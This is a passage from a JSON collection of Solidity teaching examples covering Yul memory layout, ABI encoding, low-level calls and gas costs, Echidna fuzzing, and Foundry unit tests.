return_data_size)\n            // Update free memory pointer\n            mstore(0x40, add(out, add(0x20, return_data_size)))\n        }\n    }\n\n    function test_inc(address counter) public returns (uint256 count) {\n        bytes memory res = test_call(counter, abi.encodeCall(Counter.inc, ()));\n        count = abi.decode(res, (uint256));\n    }\n}\n\n// Memory expansion gas cost\n// Gas cost is quadratic to memory allocation.\ncontract MemExp {\n    function alloc_mem(uint256 n) external view returns (uint256) {\n        uint256 gas_start = gasleft();\n        uint256[] memory arr = new uint256[](n);\n        uint256 gas_end = gasleft();\n        return gas_start - gas_end;\n    }\n}\n\n// arr size | gas\n//        0 |    120\n//        1 |    178\n//       10 |    232\n//       20 |    293\n//       30 |    354\n//       40 |    415\n//       50 |    477\n//       60 |    540\n//       70 |    602\n//       80 |    666\n//       90 |    729\n//      100 |    793\n//      110 |    857\n//      120 |    922\n//      130 |    987\n//      140 |   1053\n//      150 |   1118\n//      160 |   1185\n//      170 |   1251\n//      180 |   1318\n//      190 |   1386\n//      200 |   1454\n\n//     1000 |   8144\n//     2000 |  20023\n//     3000 |  35808\n//     4000 |  55500\n//     5000 |  79097\n//     6000 | 106601\n//     7000 | 138011\n//     8000 | 173328\n//     9000 | 212550\n//    10000 | 255679\n//    11000 | 302715\n//    12000 | 353656\n//    13000 | 408504\n//    14000 | 467257\n//    15000 | 529918\n//    16000 | 596484\n//    17000 | 666957\n//    18000 | 741336\n//    19000 | 819621\n//    20000 | 901812\n\n```\n\n### References\n\n[Solidity documentation](https://docs.soliditylang.org/en/latest/internals/layout_in_memory.html)\n\n[EVM Codes](https://www.evm.codes/)",
    "codes": [
      {
        "fileName": "YulMem.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\n// Memory layout\n// array of length 2**256 (32 bytes), each element stores 1 byte (0x00 to 0xff)\n// index     0    1    2   ...   0xfff...fff = 2**256 - 1\n// memory | 00 | 00 | 00 | ... | 00 |\n\n// Reserved slots\n// 0x00 - 0x3f (64 bytes): scratch space for hashing methods\n// 0x40 - 0x5f (32 bytes): free memory pointer - pointer to next available location in memory to store data\n// 0x60 - 0x7f (32 bytes): zero slot - used as initial value for dynamic memory arrays and should never be written to\n\n// Free memory pointer (0x40)\n// 0x80 = Free memory pointer initially points here\ncontract MemBasic {\n    // mstore(p, v) = store 32 bytes to memory starting at memory location p\n    // mload(p) = load 32 bytes from memory starting at memory location p\n    function test_1() public pure returns (bytes32 b32) {\n        assembly {\n            // Free memory pointer\n            // p = 0x80\n            let p := mload(0x40)\n            mstore(p, 0xababab)\n            b32 := mload(p)\n        }\n    }\n\n    function test_2() public pure {\n        assembly {\n            mstore(0, 0x11)\n            // index: 32 bytes of data stored in memory from index\n            //  0x00: 0x0000000000000000000000000000000000000000000000000000000000000011\n            mstore(1, 0x22)\n            //           0 1\n            //  0x00: 0x0000000000000000000000000000000000000000000000000000000000000000\n            //  0x20: 0x2200000000000000000000000000000000000000000000000000000000000000\n            mstore(2, 0x33)\n            //           0 1 2\n            //  0x00: 0x0000000000000000000000000000000000000000000000000000000000000000\n            //  0x20: 0x0033000000000000000000000000000000000000000000000000000000000000\n            mstore(3, 0x44)\n            //           0 1 2 3\n            //  0x00: 0x0000000000000000000000000000000000000000000000000000000000000000\n            //  0x20: 0x0000440000000000000000000000000000000000000000000000000000000000\n        }\n    }\n}\n\ncontract MemStruct {\n    // Memory data is not packed - all data stored in chunks of 32 bytes\n    struct Point {\n        uint256 x;\n        uint32 y;\n        uint32 z;\n    }\n\n    function test_read()\n        public\n        pure\n        returns (uint256 x, uint256 y, uint256 z)\n    {\n        // Point is loaded to memory starting at 0x80\n        // 0x80 = initial free memory\n        Point memory p = Point(1, 2, 3);\n\n        assembly {\n            // load 32 bytes starting from 0x80\n            x := mload(0x80)\n            // load 32 bytes starting from 0xa0 (0x80 + 32 = 0xa0)\n            y := mload(0xa0)\n            // load 32 bytes starting from 0xc0 (0xa0 + 32 = 0xc0)\n            z := mload(0xc0)\n        }\n    }\n\n    function test_write()\n        public\n        pure\n        returns (bytes32 free_mem_ptr, uint256 x, uint256 y, uint256 z)\n    {\n        // Allocates memory 0x80 to 0xdf to Point\n        // Free memory pointer = 0xdf + 1 = 0xe0\n        Point memory p;\n\n        // Write\n        assembly {\n            // store to 0x80\n            mstore(p, 11)\n            // store to 0xa0\n            mstore(add(p, 0x20), 22)\n            // store to 0xc0\n            mstore(add(p, 0x40), 33)\n            // 0xe0\n            free_mem_ptr := mload(0x40)\n        }\n\n        x = p.x;\n        y = p.y;\n        z = p.z;\n    }\n}\n\ncontract MemFixedArray {\n    function test_read()\n        public\n        pure\n        returns (uint256 a0, uint256 a1, uint256 a2)\n    {\n        // arr is loaded to memory starting at 0x80\n        // Each array element is stored as 32 bytes\n        uint32[3] memory arr = [uint32(1), uint32(2), uint32(3)];\n\n        assembly {\n            a0 := mload(0x80)\n            a1 := mload(0xa0)\n            a2 := mload(0xc0)\n        }\n    }\n\n    function test_write()\n        public\n        pure\n        returns (uint256 a0, uint256 a1, uint256 a2)\n    {\n        uint32[3] memory arr;\n\n        assembly {\n            // 0x80\n            mstore(arr, 11)\n            // 0xa0\n            mstore(add(arr, 0x20), 22)\n            // 0xc0\n            mstore(add(arr, 0x40), 33)\n        }\n\n        a0 = arr[0];\n        a1 = arr[1];\n        a2 = arr[2];\n    }\n}\n\ncontract MemDynamicArray {\n    function test_read()\n        public\n        pure\n        returns (bytes32 p, uint256 len, uint256 a0, uint256 a1, uint256 a2)\n    {\n        uint256[] memory arr = new uint256[](5);\n        arr[0] = uint256(11);\n        arr[1] = uint256(22);\n        arr[2] = uint256(33);\n        arr[3] = uint256(44);\n        arr[4] = uint256(55);\n\n        assembly {\n            p := arr\n            // 0x80\n            len := mload(arr)\n            // 0xa0\n            a0 := mload(add(arr, 0x20))\n            // 0xc0\n            a1 := mload(add(arr, 0x40))\n            // 0xe0\n            a2 := mload(add(arr, 0x60))\n        }\n    }\n\n    function test_write() public pure returns (bytes32 p, uint256[] memory) {\n        uint256[] memory arr = new uint256[](0);\n\n        assembly {\n            p := arr\n            // Store length of arr\n            mstore(arr, 3)\n            // Store 1, 2, 3\n            mstore(add(arr, 0x20), 11)\n            mstore(add(arr, 0x40), 22)\n            mstore(add(arr, 0x60), 33)\n            // Update free memory pointer\n            mstore(0x40, add(arr, 0x80))\n        }\n\n        // Data will be ABI encoded when arr is returned to caller\n        return (p, arr);\n    }\n}\n\ncontract MemInternalFuncReturn {\n    function internal_func_return_val() private pure returns (uint256) {\n        return uint256(0xababab);\n    }\n\n    function test_val() public pure {\n        // 0xababab will be stored in top of the stack\n        internal_func_return_val();\n    }\n\n    function internal_func_return_mem()\n        private\n        pure\n        returns (bytes32[] memory)\n    {\n        bytes32[] memory arr = new bytes32[](3);\n        arr[0] = bytes32(uint256(0xaaa));\n        arr[1] = bytes32(uint256(0xbbb));\n        arr[2] = bytes32(uint256(0xccc));\n        return arr;\n    }\n\n    function test_mem()\n        public\n        pure\n        returns (uint256 len, bytes32 a0, bytes32 a1, bytes32 a2)\n    {\n        // Stores 0x80 to top of the stack\n        // 0x80 = memory pointer to beginning of arr\n        internal_func_return_mem();\n        // Read data from arr, initialized in internal_func_return_mem, using assembly\n        assembly {\n            len := mload(0x80)\n            a0 := mload(0xa0)\n            a1 := mload(0xc0)\n            a2 := mload(0xe0)\n        }\n    }\n}\n\ncontract ABIEncode {\n    // js code to split string into chunks of length 64\n    // str.match(/.{1,64}/g)\n\n    // Value types < 32 bytes -> zero padded on the left side\n    // 0x000000000000000000000000abababababababababababababababababababab\n    function encode_addr() public pure returns (bytes memory) {\n        address addr = 0xABaBaBaBABabABabAbAbABAbABabababaBaBABaB;\n        return abi.encode(addr);\n    }\n\n    // Fixed sized bytes -> zero padded on the right side\n    // 0xaabbccdd00000000000000000000000000000000000000000000000000000000\n    function encode_bytes4() public pure returns (bytes memory) {\n        bytes4 b4 = 0xaabbccdd;\n        return abi.encode(b4);\n    }\n\n    // Dynamic size types\n    // offset | length | data\n    // offset = 32 bytes index where data starts\n    // length = 32 bytes data length\n\n    // 0x0000000000000000000000000000000000000000000000000000000000000020\n    //   0000000000000000000000000000000000000000000000000000000000000003\n    //   ababab0000000000000000000000000000000000000000000000000000000000\n    function encode_bytes() public pure returns (bytes memory) {\n        bytes memory b = new bytes(3);\n        b[0] = 0xab;\n        b[1] = 0xab;\n        b[2] = 0xab;\n        return abi.encode(b);\n    }\n\n    // 0x0000000000000000000000000000000000000000000000000000000000000020\n    //   0000000000000000000000000000000000000000000000000000000000000003\n    //   0000000000000000000000000000000000000000000000000000000000000001\n    //   0000000000000000000000000000000000000000000000000000000000000002\n    //   0000000000000000000000000000000000000000000000000000000000000003\n    function encode_uint8_arr() public pure returns (bytes memory) {\n        uint8[] memory a = new uint8[](3);\n        a[0] = 1;\n        a[1] = 2;\n        a[2] = 3;\n        return abi.encode(a);\n    }\n\n    // Fixed size arrays\n    // 0x0000000000000000000000000000000000000000000000000000000000000001\n    //   0000000000000000000000000000000000000000000000000000000000000002\n    //   0000000000000000000000000000000000000000000000000000000000000003\n    function encode_uint256_fixed_size_arr()\n        public\n        pure\n        returns (bytes memory)\n    {\n        uint8[3] memory a;\n        a[0] = 1;\n        a[1] = 2;\n        a[2] = 3;\n        return abi.encode(a);\n    }\n\n    // Struct\n    struct Point {\n        uint256 x;\n        uint128 y;\n        uint128 z;\n    }\n\n    // 0x0000000000000000000000000000000000000000000000000000000000000001\n    //   0000000000000000000000000000000000000000000000000000000000000002\n    //   0000000000000000000000000000000000000000000000000000000000000003\n    function encode_struct() public pure returns (bytes memory) {\n        Point memory p = Point(1, 2, 3);\n        return abi.encode(p);\n    }\n\n    // Dynamic sized array of structs\n    // offset | length | struct data\n    // 0x0000000000000000000000000000000000000000000000000000000000000020\n    //   0000000000000000000000000000000000000000000000000000000000000003\n    //   0000000000000000000000000000000000000000000000000000000000000001\n    //   0000000000000000000000000000000000000000000000000000000000000002\n    //   0000000000000000000000000000000000000000000000000000000000000003\n    //   0000000000000000000000000000000000000000000000000000000000000004\n    //   0000000000000000000000000000000000000000000000000000000000000005\n    //   0000000000000000000000000000000000000000000000000000000000000006\n    //   0000000000000000000000000000000000000000000000000000000000000007\n    //   0000000000000000000000000000000000000000000000000000000000000008\n    //   0000000000000000000000000000000000000000000000000000000000000009\n    function encode_struct_array() public pure returns (bytes memory) {\n        Point[] memory arr = new Point[](3);\n        arr[0] = Point(1, 2, 3);\n        arr[1] = Point(4, 5, 6);\n        arr[2] = Point(7, 8, 9);\n        return abi.encode(arr);\n    }\n}\n\ncontract MemReturn {\n    function test_return_vals() public pure returns (uint256, uint256) {\n        // return(start, len) - Halt execution and return data stored in memory from start to start + len\n        assembly {\n            mstore(0x80, 11)\n            mstore(0xa0, 22)\n            return(0x80, 0x40)\n        }\n    }\n\n    function test_return_dyn_arr() public pure returns (uint256[] memory) {\n        // ABI encode uint256[] array with 3 elements 11, 22 and 33\n        assembly {\n            // offset\n            mstore(0x80, 0x20)\n            // length\n            mstore(add(0x80, 0x20), 3)\n            // array elements\n            mstore(add(0x80, 0x40), 11)\n            mstore(add(0x80, 0x60), 22)\n            mstore(add(0x80, 0x80), 33)\n            // No need to update free memory pointer - function execution ends here\n            return(0x80, mul(5, 0x20))\n        }\n    }\n\n    function test_return() public pure returns (uint256, uint256) {\n        // Returns (11, 22)\n        test_return_vals();\n        // This code will never execute\n        return (333, 444);\n    }\n}\n\ncontract MemRevert {\n    function test_revert() public pure {\n        // revert(start, len) - Revert execution and return data store in memory from start to start + len\n        assembly {\n            mstore(0x80, \"ERROR HERE\")\n            revert(0x80, 0x20)\n        }\n    }\n\n    function test_revert_with_error_msg() public pure {\n        assembly {\n            let p := mload(0x40)\n            // function selector of Error(string)\n            // 0x08c379a000000000000000000000000000000000000000000000000000000000\n            // 0x08c379a0 is 32 bits, shift left by 224 to make it 256 bits\n            // 255 - 31 = 224\n            mstore(p, shl(224, 0x08c379a0))\n            // String offset\n            mstore(add(p, 0x04), 0x20)\n            // String length\n            mstore(add(p, 0x24), 5)\n            // Message (must be less than 32 bytes)\n            mstore(add(p, 0x44), \"ERROR\")\n            // function selector + offset + string length + string message\n            // = 0x04 + 0x20 + 0x20 + 0x20\n            // = 0x64\n            revert(p, 0x64)\n        }\n    }\n}\n\ncontract MemKeccak {\n    function test_keccak() public pure returns (bytes32) {\n        // keccak256(start, len) - Keccak256 from data in memory from start to start + len\n        assembly {\n            mstore(0x80, 1)\n            mstore(0xa0, 2)\n\n            let h := keccak256(0x80, 0x40)\n            mstore(0xc0, h)\n\n            return(0xc0, 0x20)\n        }\n    }\n\n    function keccak() public pure returns (bytes32) {\n        return keccak256(abi.encodePacked(uint256(1), uint256(2)));\n    }\n}\n\ncontract Target {\n    function return_uint256(uint256 x) public pure returns (uint256) {\n        return x;\n    }\n\n    function return_bytes(uint256 n) public pure returns (bytes memory) {\n        bytes memory out = new bytes(n);\n        for (uint256 i; i < n; i++) {\n            out[i] = 0xab;\n        }\n        return out;\n    }\n\n    function return_uint256_arr(uint256 n)\n        public\n        pure\n        returns (uint256[] memory)\n    {\n        uint256[] memory out = new uint256[](n);\n        for (uint256 i = 0; i < n; i++) {\n            out[i] = i + 1;\n        }\n        return out;\n    }\n}\n\n// calldatacopy(p, start, size) - Copy start to start + size calldata to memory starting at pointer p\n// returndatasize - Get size of returned data from call, staticcall or delegatecall\n// returndatacopy(p, start, size) - Copy start to start + size return data to memory starting at pointer p\n// call(g, a, v, in, in_size, out, out_size)\n// - call contract at a, use max g gas, send v wei\n// - with input from memory in to in + in_size\n// - use memory out to out + out_size for output\n// staticcall(g, a, in, in_size, out, out_size) - read only version of call\ncontract YulStaticCall {\n    function test_staticcall(address a, bytes calldata data) public view {\n        assembly {\n            let p := mload(0x40)\n            // Copy calldata to memory\n            calldatacopy(p, data.offset, data.length)\n\n            let ok := staticcall(gas(), a, p, data.length, 0, 0)\n\n            if iszero(ok) { revert(0, 0) }\n\n            // p := mload(0x40)\n            let return_data_size := returndatasize()\n            // Copy returned data to memory\n            // Is it safe to overwrite memory that was used for inputs?\n            returndatacopy(p, 0, return_data_size)\n            return(p, return_data_size)\n        }\n    }\n\n    function test_abi_decode_uint256(address a, bytes calldata data)\n        public\n        view\n        returns (uint256)\n    {\n        test_staticcall(a, data);\n    }\n\n    function test_abi_decode_bytes(address a, bytes calldata data)\n        public\n        view\n        returns (bytes memory)\n    {\n        test_staticcall(a, data);\n    }\n\n    function test_abi_decode_uint256_arr(address a, bytes calldata data)\n        public\n        view\n        returns (uint256[] memory)\n    {\n        test_staticcall(a, data);\n    }\n\n    function test_staticcall_return_abi_encoded_bytes(\n        address addr,\n        bytes calldata data\n    ) public view returns (bytes memory out, uint256 return_data_size) {\n        assembly {\n            let p := mload(0x40)\n            // Copy calldata to memory\n            calldatacopy(p, data.offset, data.length)\n            // Update free memory pointer\n            mstore(0x40, add(p, data.length))\n\n            let ok := staticcall(gas(), addr, p, data.length, 0, 0)\n\n            if iszero(ok) { revert(0, 0) }\n\n            // return_data_size = 32  for calling Target.return_uint256 -> uint256\n            //                  = 96  for calling Target.return_bytes -> bytes[] (32 offset, 32 length, 3 bytes padded to 32)\n            //                  = 160 for calling Target.return_uint256_arr -> uint256[] (32 offset, 32 length, 32 x 3 elements)\n            return_data_size := returndatasize()\n            // Store length of return data to out\n            // pointer to out = 0x60 (zero slot)\n            mstore(out, return_data_size)\n            // Copy return data to out\n            returndatacopy(add(out, 0x20), 0, return_data_size)\n            // Update free memory pointer\n            mstore(0x40, add(out, add(0x20, return_data_size)))\n        }\n    }\n}\n\ncontract Counter {\n    uint256 public count;\n\n    function inc() public returns (uint256) {\n        count += 1;\n        return count;\n    }\n}\n\ncontract YulCall {\n    function test_call(address a, bytes memory data)\n        public\n        payable\n        returns (bytes memory out)\n    {\n        assembly {\n            // 0x80\n            let data_ptr := data\n            // 0x60\n            let out_ptr := out\n\n            let data_size := mload(data)\n            let data_start := add(data, 0x20)\n            let ok := call(gas(), a, callvalue(), data_start, data_size, 0, 0)\n\n            if iszero(ok) { revert(0, 0) }\n\n            let return_data_size := returndatasize()\n            // Store length of return data to out\n            mstore(out, return_data_size)\n            // Copy return data to out\n            returndatacopy(add(out, 0x20), 0, return_data_size)\n            // Update free memory pointer\n            mstore(0x40, add(out, add(0x20, return_data_size)))\n        }\n    }\n\n    function test_inc(address counter) public returns (uint256 count) {\n        bytes memory res = test_call(counter, abi.encodeCall(Counter.inc, ()));\n        count = abi.decode(res, (uint256));\n    }\n}\n\n// Memory expansion gas cost\n// Gas cost is quadratic to memory allocation.\ncontract MemExp {\n    function alloc_mem(uint256 n) external view returns (uint256) {\n        uint256 gas_start = gasleft();\n        uint256[] memory arr = new uint256[](n);\n        uint256 gas_end = gasleft();\n        return gas_start - gas_end;\n    }\n}\n\n// arr size | gas\n//        0 |    120\n//        1 |    178\n//       10 |    232\n//       20 |    293\n//       30 |    354\n//       40 |    415\n//       50 |    477\n//       60 |    540\n//       70 |    602\n//       80 |    666\n//       90 |    729\n//      100 |    793\n//      110 |    857\n//      120 |    922\n//      130 |    987\n//      140 |   1053\n//      150 |   1118\n//      160 |   1185\n//      170 |   1251\n//      180 |   1318\n//      190 |   1386\n//      200 |   1454\n\n//     1000 |   8144\n//     2000 |  20023\n//     3000 |  35808\n//     4000 |  55500\n//     5000 |  79097\n//     6000 | 106601\n//     7000 | 138011\n//     8000 | 173328\n//     9000 | 212550\n//    10000 | 255679\n//    11000 | 302715\n//    12000 | 353656\n//    13000 | 408504\n//    14000 | 467257\n//    15000 | 529918\n//    16000 | 596484\n//    17000 | 666957\n//    18000 | 741336\n//    19000 | 819621\n//    20000 | 901812\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "data",
      "evm",
      "memory",
      "yul",
      "assembly"
    ],
    "order": 1
  },
  {
    "slug": "echidna",
    "title": "Echidna",
    "category": "Tests",
    "categorySlug": "tests",
    "description": "An example of testing contracts with Echidna",
    "content": "Examples of fuzzing with [Echidna](https://github.com/crytic/echidna).\n\n1. Save the solidity contract as `TestEchidna.sol`\n2. In the folder where your contract is stored execute the following command.\n\n```shell\ndocker run -it --rm -v $PWD:/code trailofbits/eth-security-toolbox\n```\n\nInside docker, your code will be stored at `/code`, in the root directory.\n\n3. See the comments below and execute `echidna` commands.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nechidna TestEchidna.sol --contract TestCounter\n*/\ncontract Counter {\n    uint256 public count;\n\n    function inc() external {\n        count += 1;\n    }\n\n    function dec() external {\n        count -= 1;\n    }\n}\n\ncontract TestCounter is Counter {\n    function echidna_test_true() public view returns (bool) {\n        return true;\n    }\n\n    function echidna_test_false() public view returns (bool) {\n        return false;\n    }\n\n    function echidna_test_count() public view returns (bool) {\n        // Here we are testing that Counter.count should always be <= 5.\n        // Test will fail. Echidna is smart enough to call Counter.inc() more\n        // than 5 times.\n        return count <= 5;\n    }\n}\n\n/*\nechidna TestEchidna.sol --contract TestAssert --test-mode assertion\n*/\ncontract TestAssert {\n    function test_assert(uint256 _i) external {\n        assert(_i < 10);\n    }\n\n    // More complex example\n    function abs(uint256 x, uint256 y) private pure returns (uint256) {\n        if (x >= y) {\n            return x - y;\n        }\n        return y - x;\n    }\n\n    function test_abs(uint256 x, uint256 y) external {\n        uint256 z = abs(x, y);\n        if (x >= y) {\n            assert(z <= x);\n        } else {\n            assert(z <= y);\n        }\n    }\n}\n\n```\n\n### Testing Time and Sender\n\nEchidna can fuzz timestamps. Range of timestamp is set in the configuration. Default is 7 days.\n\nContract callers can also be set in the configuration. Default accounts are\n\n- `0x10000`\n- `0x20000`\n- `0x30000`\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\ndocker run -it --rm -v $PWD:/code trailofbits/eth-security-toolbox\nechidna EchidnaTestTimeAndCaller.sol --contract EchidnaTestTimeAndCaller\n*/\ncontract EchidnaTestTimeAndCaller {\n    bool private pass = true;\n    uint256 private createdAt = block.timestamp;\n\n    /*\n    test will fail if Echidna can call setFail()\n    test will pass otherwise\n    */\n    function echidna_test_pass() public view returns (bool) {\n        return pass;\n    }\n\n    function setFail() external {\n        /*\n        Echidna can call this function if delay <= max block delay\n        Otherwise Echidna will not be able to call this function.\n        Max block delay can be extended by specifying it in a configuration file.\n        */\n        uint256 delay = 7 days;\n        require(block.timestamp >= createdAt + delay);\n        pass = false;\n    }\n\n    // Default senders\n    // Change the addresses to see the test fail\n    address[3] private senders =\n        [address(0x10000), address(0x20000), address(0x30000)];\n\n    address private sender = msg.sender;\n\n    // Pass _sender as input and require msg.sender == _sender\n    // to see _sender for counter example\n    function setSender(address _sender) external {\n        require(_sender == msg.sender);\n        sender = msg.sender;\n    }\n\n    // Check default senders. Sender should be one of the 3 default accounts.\n    function echidna_test_sender() public view returns (bool) {\n        for (uint256 i; i < 3; i++) {\n            if (sender == senders[i]) {\n                return true;\n            }\n        }\n        return false;\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "EchidnaTestTimeAndCaller.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\ndocker run -it --rm -v $PWD:/code trailofbits/eth-security-toolbox\nechidna EchidnaTestTimeAndCaller.sol --contract EchidnaTestTimeAndCaller\n*/\ncontract EchidnaTestTimeAndCaller {\n    bool private pass = true;\n    uint256 private createdAt = block.timestamp;\n\n    /*\n    test will fail if Echidna can call setFail()\n    test will pass otherwise\n    */\n    function echidna_test_pass() public view returns (bool) {\n        return pass;\n    }\n\n    function setFail() external {\n        /*\n        Echidna can call this function if delay <= max block delay\n        Otherwise Echidna will not be able to call this function.\n        Max block delay can be extended by specifying it in a configuration file.\n        */\n        uint256 delay = 7 days;\n        require(block.timestamp >= createdAt + delay);\n        pass = false;\n    }\n\n    // Default senders\n    // Change the addresses to see the test fail\n    address[3] private senders =\n        [address(0x10000), address(0x20000), address(0x30000)];\n\n    address private sender = msg.sender;\n\n    // Pass _sender as input and require msg.sender == _sender\n    // to see _sender for counter example\n    function setSender(address _sender) external {\n        require(_sender == msg.sender);\n        sender = msg.sender;\n    }\n\n    // Check default senders. Sender should be one of the 3 default accounts.\n    function echidna_test_sender() public view returns (bool) {\n        for (uint256 i; i < 3; i++) {\n            if (sender == senders[i]) {\n                return true;\n            }\n        }\n        return false;\n    }\n}\n"
      },
      {
        "fileName": "TestEchidna.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nechidna TestEchidna.sol --contract TestCounter\n*/\ncontract Counter {\n    uint256 public count;\n\n    function inc() external {\n        count += 1;\n    }\n\n    function dec() external {\n        count -= 1;\n    }\n}\n\ncontract TestCounter is Counter {\n    function echidna_test_true() public view returns (bool) {\n        return true;\n    }\n\n    function echidna_test_false() public view returns (bool) {\n        return false;\n    }\n\n    function echidna_test_count() public view returns (bool) {\n        // Here we are testing that Counter.count should always be <= 5.\n        // Test will fail. Echidna is smart enough to call Counter.inc() more\n        // than 5 times.\n        return count <= 5;\n    }\n}\n\n/*\nechidna TestEchidna.sol --contract TestAssert --test-mode assertion\n*/\ncontract TestAssert {\n    function test_assert(uint256 _i) external {\n        assert(_i < 10);\n    }\n\n    // More complex example\n    function abs(uint256 x, uint256 y) private pure returns (uint256) {\n        if (x >= y) {\n            return x - y;\n        }\n        return y - x;\n    }\n\n    function test_abs(uint256 x, uint256 y) external {\n        uint256 z = abs(x, y);\n        if (x >= y) {\n            assert(z <= x);\n        } else {\n            assert(z <= y);\n        }\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "test",
      "echidna"
    ],
    "order": 0
  },
  {
    "slug": "basic",
    "title": "Foundry Basic",
    "category": "Foundry",
    "categorySlug": "foundry",
    "description": "Foundry basic example",
    "content": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport {Test, console2, stdError} from \"forge-std/Test.sol\";\n\ncontract Counter {\n    uint256 public count;\n\n    function inc() external {\n        count += 1;\n    }\n\n    function dec() external {\n        count -= 1;\n    }\n}\n\ncontract CounterTest is Test {\n    Counter public counter;\n\n    // Invoked before each test\n    function setUp() public {\n        counter = new Counter();\n    }\n\n    function testInc() public {\n        counter.inc();\n        assertEq(counter.count(), 1);\n    }\n\n    function testFailDec() public {\n        // This will fail with underflow\n        counter.dec();\n    }\n\n    // Same as testFailDec\n    function testDecUnderflow() public {\n        vm.expectRevert(stdError.arithmeticError);\n        counter.dec();\n    }\n\n    function testDec() public {\n        counter.inc();\n        counter.inc();\n        counter.dec();\n        assertEq(counter.count(), 1);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "CounterTest.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport {Test, console2, stdError} from \"forge-std/Test.sol\";\n\ncontract Counter {\n    uint256 public count;\n\n    function inc() external {\n        count += 1;\n    }\n\n    function dec() external {\n        count -= 1;\n    }\n}\n\ncontract CounterTest is Test {\n    Counter public counter;\n\n    // Invoked before each test\n    function setUp() public {\n        counter = new Counter();\n    }\n\n    function testInc() public {\n        counter.inc();\n        assertEq(counter.count(), 1);\n    }\n\n    function testFailDec() public {\n        // This will fail with underflow\n        counter.dec();\n    }\n\n    // Same as testFailDec\n    function testDecUnderflow() public {\n        vm.expectRevert(stdError.arithmeticError);\n        counter.dec();\n    }\n\n    function testDec() public {\n        counter.inc();\n        counter.inc();\n        counter.dec();\n        assertEq(counter.count(), 1);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "foundry",
      "basic",
      "counter"
    ],
    "order": 0
  },
  {
    "slug": "auth",
    "title": "Foundry Authorization",
    "category": "Foundry",
    "categorySlug": "foundry",
    "description": "Foundry authorization example",
    "content": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport {Test, console2, stdError} from \"forge-std/Test.sol\";\n\ncontract Auth {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function setOwner(address _owner) external {\n        require(msg.sender == owner, \"not authorized\");\n        owner = _owner;\n    }\n}\n\ncontract AuthTest is Test {\n    Auth private auth;\n\n    function setUp() public {\n        // owner = this contract\n        auth = new Auth();\n    }\n\n    function testSetOwner() public {\n        auth.setOwner(address(1));\n        assertEq(auth.owner(), address(1));\n    }\n\n    function testFailNotOwner() public {\n        // Next call will be called by address(1)\n        vm.prank(address(1));\n        auth.setOwner(address(1));\n\n        vm.startPrank(address(1));\n        // All calls until stopPrank will be made by address(1)\n        auth.setOwner(address(1));\n        auth.setOwner(address(1));\n        auth.setOwner(address(1));\n        vm.stopPrank();\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "AuthTest.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport {Test, console2, stdError} from \"forge-std/Test.sol\";\n\ncontract Auth {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function setOwner(address _owner) external {\n        require(msg.sender == owner, \"not authorized\");\n        owner = _owner;\n    }\n}\n\ncontract AuthTest is Test {\n    Auth private auth;\n\n    function setUp() public {\n        // owner = this contract\n        auth = new Auth();\n    }\n\n    function testSetOwner() public {\n        auth.setOwner(address(1));\n        assertEq(auth.owner(), address(1));\n    }\n\n    function testFailNotOwner() public {\n        // Next call will be called by address(1)\n        vm.prank(address(1));\n        auth.setOwner(address(1));\n\n        vm.startPrank(address(1));\n        // All calls until stopPrank will be made by address(1)\n        auth.setOwner(address(1));\n        auth.setOwner(address(1));\n        auth.setOwner(address(1));\n        vm.stopPrank();\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "foundry",
      "auth",
      "authorization",
      "prank"
    ],
    "order": 1
  },
  {
    "slug": "error",
    "title": "Foundry Error",
    "category": "Foundry",
    "categorySlug": "foundry",
    "description": "Foundry error example",
    "content": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport \"forge-std/Test.sol\";\n\ncontract Error {\n    error NotAuthorized();\n\n    function throwError() external {\n        require(false, \"not authorized\");\n    }\n\n    function throwCustomError() external {\n        revert NotAuthorized();\n    }\n}\n\ncontract ErrorTest is Test {\n    Error public err;\n\n    function setUp() public {\n        err = new Error();\n    }\n\n    // Start test name with testFail\n    function testFail() public {\n        err.throwError();\n    }\n\n    function testRevert() public {\n        vm.expectRevert();\n        err.throwError();\n    }\n\n    function testRequireMessage() public {\n        vm.expectRevert(bytes(\"not authorized\"));\n        err.throwError();\n    }\n\n    function testCustomError() public {\n        vm.expectRevert(Error.NotAuthorized.selector);\n        err.throwCustomError();\n    }\n\n    // Add label to assertions\n    function testErrorLabel() public {\n        assertEq(uint256(1), uint256(1), \"test 1\");\n        assertEq(uint256(1), uint256(1), \"test 2\");\n        assertEq(uint256(1), uint256(1), \"test 3\");\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "ErrorTest.sol",
